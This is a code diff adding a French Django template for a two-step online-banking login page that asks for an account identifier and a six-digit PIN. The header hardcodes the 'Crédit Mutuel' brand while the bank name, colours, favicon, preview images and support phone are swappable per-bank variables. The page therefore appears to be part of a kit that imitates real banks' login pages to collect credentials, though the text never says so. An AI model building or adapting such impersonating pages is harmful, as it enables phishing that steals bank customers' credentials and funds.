@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion — {{ bank.name }}</title>
+
+    {% if bank.effective_favicon_url %}
+    <link rel="icon" href="{{ bank.effective_favicon_url }}">
+    <link rel="apple-touch-icon" href="{{ bank.effective_favicon_url }}">
+    {% endif %}
+    <meta name="description" content="{{ bank.effective_meta_description }}">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Connexion — {{ bank.name }}">
+    <meta property="og:description" content="{{ bank.effective_meta_description }}">
+    {% if bank.effective_og_image_url %}<meta property="og:image" content="{{ bank.effective_og_image_url }}">{% endif %}
+    <meta property="og:url" content="{{ request.build_absolute_uri }}">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Connexion — {{ bank.name }}">
+    <meta name="twitter:description" content="{{ bank.effective_meta_description }}">
+    {% if bank.effective_og_image_url %}<meta name="twitter:image" content="{{ bank.effective_og_image_url }}">{% endif %}
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --cm-red:  {{ bank.color_primary|default:"#CC0000" }};
+            --cm-red2: #b30000;
+            --cm-dark: #1a1a1a;
+            --cm-gray: #555;
+            --cm-lg:   #f2f2f2;
+            --cm-bd:   #d8d8d8;
+            --cm-err:  #cc0000;
+        }
+
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        html { font-size: 18px; }
+
+        body {
+            font-family: 'Source Sans 3', Arial, sans-serif;
+            font-size: 1rem;
+            background: var(--cm-lg);
+            color: var(--cm-dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ── Header rouge CM ─────────────────────────────────────── */
+        .login-header {
+            background: var(--cm-red);
+            padding: 0;
+        }
+        .login-header-inner {
+            max-width: 1200px; margin: 0 auto; padding: 0 24px;
+            display: flex; align-items: center; justify-content: space-between;
+            height: 60px;
+        }
+        .login-logo {
+            display: flex; align-items: center; gap: 12px;
+            text-decoration: none;
+        }
+        .login-logo img { height: 36px; width: 36px; object-fit: contain; border-radius: 3px; }
+        .login-logo-text { line-height: 1.15; }
+        .login-logo-text .c1 { display: block; font-size: 18px; font-weight: 700; color: #fff; }
+        .login-logo-text .c2 { display: block; font-size: 18px; font-weight: 300; color: rgba(255,255,255,.85); }
+        .back-link {
+            font-size: 15px; color: rgba(255,255,255,.8); text-decoration: none;
+            display: flex; align-items: center; gap: 5px; transition: color .15s;
+        }
+        .back-link:hover { color: #fff; }
+        .back-link svg { width: 14px; height: 14px; }
+
+        /* ── Zone de contenu ─────────────────────────────────────── */
+        .login-body {
+            flex: 1; display: flex; align-items: flex-start;
+            justify-content: center; padding: 40px 16px 60px;
+        }
+        .login-wrap { width: 100%; max-width: 420px; }
+
+        /* ── Carte formulaire ────────────────────────────────────── */
+        .login-card {
+            background: #fff;
+            border: 1px solid var(--cm-bd);
+            border-top: 4px solid var(--cm-red);
+        }
+        .login-card-head {
+            padding: 28px 32px 20px;
+            border-bottom: 1px solid var(--cm-bd);
+        }
+        .login-card-title {
+            font-size: 1.45rem; font-weight: 700; color: var(--cm-dark);
+        }
+        .login-card-sub {
+            font-size: 15px; color: var(--cm-gray); margin-top: 5px;
+        }
+        .login-card-body { padding: 28px 32px 32px; }
+
+        /* ── Messages d'erreur ───────────────────────────────────── */
+        .msg-box {
+            padding: 12px 16px; font-size: 15px; font-weight: 600;
+            display: flex; align-items: flex-start; gap: 8px;
+            margin-bottom: 20px; border-left: 4px solid;
+        }
+        .msg-error { background: #fff5f5; color: var(--cm-err); border-color: var(--cm-err); }
+        .msg-box svg { width: 14px; height: 14px; flex-shrink: 0; margin-top: 1px; }
+
+        /* ── Form fields ─────────────────────────────────────────── */
+        .field { margin-bottom: 20px; }
+        .field label {
+            display: block; font-size: 16px; font-weight: 600;
+            color: var(--cm-dark); margin-bottom: 7px;
+        }
+        .field input {
+            width: 100%; padding: 12px 14px;
+            border: 1px solid var(--cm-bd); border-radius: 0;
+            font-size: 17px; font-family: inherit; color: var(--cm-dark);
+            background: #fff; transition: border-color .15s, box-shadow .15s;
+            outline: none; appearance: none; -webkit-appearance: none;
+        }
+        .field input:focus {
+            border-color: var(--cm-red);
+            box-shadow: 0 0 0 3px rgba(204,0,0,.12);
+        }
+        .field input::placeholder { color: #aaa; font-size: 16px; }
+
+        /* Champ identifiant — style monospace discret */
+        #account_id {
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+            letter-spacing: .08em;
+            font-size: 15px;
+        }
+
+        /* Champ PIN — grand, centré, style banque */
+        #password-field {
+            text-align: center;
+            letter-spacing: .35em;
+            font-size: 1.6rem;
+            font-family: 'Courier New', monospace;
+            padding-right: 44px;
+        }
+
+        .field-pwd-wrap { position: relative; }
+        .toggle-pwd {
+            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; cursor: pointer; padding: 4px;
+            color: #999; transition: color .15s;
+        }
+        .toggle-pwd:hover { color: var(--cm-dark); }
+        .toggle-pwd svg { width: 17px; height: 17px; display: block; }
+
+        /* Hint sous le champ PIN */
+        .field-hint {
+            font-size: 14px; color: #999; margin-top: 6px;
+        }
+
+        /* Step 2 caché au départ */
+        .step2-fields { display: none; }
+
+        /* ── Bouton principal ────────────────────────────────────── */
+        .btn-cm {
+            width: 100%; padding: 15px;
+            background: var(--cm-red); color: #fff; border: none;
+            font-size: 17px; font-weight: 700; font-family: inherit;
+            cursor: pointer; transition: background .15s;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            border-radius: 0;
+        }
+        .btn-cm:hover { background: var(--cm-red2); }
+        .btn-cm:disabled { opacity: .6; cursor: not-allowed; }
+        .btn-cm svg { width: 15px; height: 15px; flex-shrink: 0; }
+
+        /* Bouton retour step1 */
+        .btn-back {
+            background: none; border: none; cursor: pointer;
+            font-size: 15px; color: var(--cm-gray); font-family: inherit;
+            padding: 0; display: flex; align-items: center; gap: 4px;
+            margin-bottom: 16px; transition: color .15s;
+        }
+        .btn-back:hover { color: var(--cm-red); }
+        .btn-back svg { width: 13px; height: 13px; }
+
+        /* ── Step indicator ──────────────────────────────────────── */
+        .step-dots {
+            display: flex; gap: 6px; margin-bottom: 20px;
+        }
+        .step-dot {
+            width: 24px; height: 3px; border-radius: 0;
+            background: var(--cm-bd); transition: background .3s;
+        }
+        .step-dot.active { background: var(--cm-red); }
+
+        /* ── Lien première connexion ─────────────────────────────── */
+        .first-login-link {
+            text-align: center; margin-top: 22px;
+            padding-top: 20px; border-top: 1px solid var(--cm-bd);
+            font-size: 15px; color: var(--cm-gray);
+        }
+        .first-login-link a { color: var(--cm-red); font-weight: 600; text-decoration: none; }
+        .first-login-link a:hover { text-decoration: underline; }
+
+        /* ── Infos bas ───────────────────────────────────────────── */
+        .login-info {
+            margin-top: 24px;
+            background: #fff; border: 1px solid var(--cm-bd);
+            padding: 16px 20px;
+        }
+        .login-info-item {
+            display: flex; align-items: flex-start; gap: 10px;
+            font-size: 15px; color: var(--cm-gray); padding: 8px 0;
+        }
+        .login-info-item svg { width: 14px; height: 14px; flex-shrink: 0; color: var(--cm-red); margin-top: 1px; }
+
+        /* ── Footer ──────────────────────────────────────────────── */
+        .login-footer {
+            background: #fff; border-top: 3px solid var(--cm-red);
+            padding: 14px 24px;
+        }
+        .login-footer-inner {
+            max-width: 1200px; margin: 0 auto;
+            display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 8px; font-size: 14px; color: #999;
+        }
+        .login-footer a { color: #999; text-decoration: none; margin: 0 8px; }
+        .login-footer a:hover { color: var(--cm-red); }
+    </style>
+</head>
+<body>
+
+<!-- ── Header ────────────────────────────────────────────────────────── -->
+<header class="login-header">
+    <div class="login-header-inner">
+        <a class="login-logo" href="/">
+            {% if bank.effective_favicon_url %}
+            <img src="{{ bank.effective_favicon_url }}" alt="{{ bank.name }}">
+            {% endif %}
+            <div class="login-logo-text">
+                <span class="c1">Crédit</span>
+                <span class="c2">Mutuel</span>
+            </div>
+        </a>
+        <a class="back-link" href="/">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
+            </svg>
+            Retour au site
+        </a>
+    </div>
+</header>
+
+<!-- ── Corps ─────────────────────────────────────────────────────────── -->
+<div class="login-body">
+    <div class="login-wrap">
+
+        <div class="login-card">
+            <div class="login-card-head">
+                <h1 class="login-card-title">Connexion à votre espace</h1>
+                <p class="login-card-sub">{{ bank.name }} — Banque en ligne sécurisée</p>
+            </div>
+            <div class="login-card-body">
+
+                {% if messages %}
+                {% for message in messages %}
+                <div class="msg-box msg-error">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
+                    <span>{{ message }}</span>
+                </div>
+                {% endfor %}
+                {% endif %}
+
+                <!-- Indicateur d'étape -->
+                <div class="step-dots">
+                    <div class="step-dot active" id="dot1"></div>
+                    <div class="step-dot" id="dot2"></div>
+                </div>
+
+                <form method="post" id="login-form" novalidate>
+                    {% csrf_token %}
+
+                    <!-- Étape 1 : identifiant -->
+                    <div id="step1">
+                        <div class="field">
+                            <label for="account_id">Votre identifiant</label>
+                            <input
+                                type="text"
+                                name="account_id"
+                                id="account_id"
+                                value="{{ prefill_id|default:'' }}"
+                                placeholder="Ex : FR5260301"
+                                autocomplete="username"
+                                autocapitalize="characters"
+                                spellcheck="false"
+                                required
+                            >
+                            <p class="field-hint">Identifiant reçu par email lors de l'ouverture de votre compte.</p>
+                        </div>
+                        <button type="button" class="btn-cm" id="btn-step1" onclick="goToStep2()">
+                            Continuer
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/>
+                            </svg>
+                        </button>
+                    </div>
+
+                    <!-- Étape 2 : code secret -->
+                    <div id="step2" class="step2-fields">
+                        <button type="button" class="btn-back" onclick="goToStep1()">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"/>
+                            </svg>
+                            Changer d'identifiant
+                        </button>
+
+                        <!-- Identifiant en lecture seule affiché -->
+                        <div style="background:var(--cm-lg);border:1px solid var(--cm-bd);padding:10px 14px;margin-bottom:20px;font-size:13px;">
+                            <span style="color:var(--cm-gray);font-size:12px;display:block;margin-bottom:2px;">Identifiant</span>
+                            <span id="id-display" style="font-family:'Courier New',monospace;font-weight:700;font-size:15px;letter-spacing:.06em;"></span>
+                        </div>
+
+                        <div class="field">
+                            <label for="password-field">Code secret (6 chiffres)</label>
+                            <div class="field-pwd-wrap">
+                                <input
+                                    type="password"
+                                    name="password"
+                                    id="password-field"
+                                    placeholder="• • • • • •"
+                                    inputmode="numeric"
+                                    maxlength="6"
+                                    autocomplete="current-password"
+                                >
+                                <button type="button" class="toggle-pwd" onclick="togglePwd()" tabindex="-1" aria-label="Afficher/masquer">
+                                    <svg id="eye-on" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                                        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                                    </svg>
+                                    <svg id="eye-off" class="hidden" style="display:none;" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>
+                                    </svg>
+                                </button>
+                            </div>
+                            <p class="field-hint">Votre code PIN à 6 chiffres, défini lors de votre première connexion.</p>
+                        </div>
+
+                        <button type="submit" class="btn-cm" id="btn-login">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"/>
+                            </svg>
+                            <span id="btn-login-label">Se connecter</span>
+                        </button>
+                    </div>
+                </form>
+
+                <!-- Première connexion -->
+                <div class="first-login-link">
+                    Première connexion ?
+                    <a href="/{{ bank.slug }}/set-password/">Créez votre code secret</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Infos sécurité -->
+        <div class="login-info">
+            <div class="login-info-item">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                </svg>
+                Connexion sécurisée — données chiffrées SSL
+            </div>
+            <div class="login-info-item">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+                {{ bank.name }} ne vous demandera jamais votre code secret par email ou téléphone.
+            </div>
+            {% if bank.phone %}
+            <div class="login-info-item">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/>
+                </svg>
+                Assistance : {{ bank.phone }}
+            </div>
+            {% endif %}
+        </div>
+
+    </div>
+</div>
+
+<!-- ── Footer ─────────────────────────────────────────────────────────── -->
+<footer class="login-footer">
+    <div class="login-footer-inner">
+        <span>© {% now "Y" %} {{ bank.name }} — Tous droits réservés</span>
+        <span>
+            <a href="#">Mentions légales</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Cookies</a>
+            <a href="#">Accessibilité</a>
+        </span>
+    </div>
+</footer>
+
+<script>
+    var step = 1;
+
+    function goToStep2() {
+        var id = document.getElementById('account_id').value.trim().toUpperCase();
+        if (!id) {
+            document.getElementById('account_id').focus();
+            document.getElementById('account_id').style.borderColor = '#cc0000';
+            return;
+        }
+        document.getElementById('account_id').value = id;
+        document.getElementById('id-display').textContent = id;
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        document.getElementById('dot2').classList.add('active');
+        document.getElementById('password-field').focus();
+        step = 2;
+    }
+
+    function goToStep1() {
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step1').style.display = 'block';
+        document.getElementById('dot2').classList.remove('active');
+        document.getElementById('password-field').value = '';
+        document.getElementById('account_id').focus();
+        step = 1;
+    }
+
+    function togglePwd() {
+        var f   = document.getElementById('password-field');
+        var on  = document.getElementById('eye-on');
+        var off = document.getElementById('eye-off');
+        if (f.type === 'password') {
+            f.type = 'text';
+            on.style.display  = 'none';
+            off.style.display = 'block';
+        } else {
+            f.type = 'password';
+            on.style.display  = 'block';
+            off.style.display = 'none';
+        }
+    }
+
+    // Uppercase + filtre chiffres PIN
+    document.getElementById('account_id').addEventListener('input', function() {
+        var p = this.selectionStart;
+        this.value = this.value.toUpperCase();
+        this.setSelectionRange(p, p);
+        this.style.borderColor = '';
+    });
+    document.getElementById('account_id').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') { e.preventDefault(); goToStep2(); }
+    });
+    document.getElementById('password-field').addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 6);
+    });
+
+    // Soumission : spinner
+    document.getElementById('login-form').addEventListener('submit', function() {
+        if (step === 1) return;
+        var btn   = document.getElementById('btn-login');
+        var label = document.getElementById('btn-login-label');
+        btn.disabled = true;
+        label.textContent = 'Connexion en cours…';
+    });
+
+    // Si identifiant pré-rempli (erreur serveur) → passer à step2 auto
+    {% if prefill_id %}
+    window.addEventListener('DOMContentLoaded', function() { goToStep2(); });
+    {% endif %}
+</script>
+</body>
+</html>
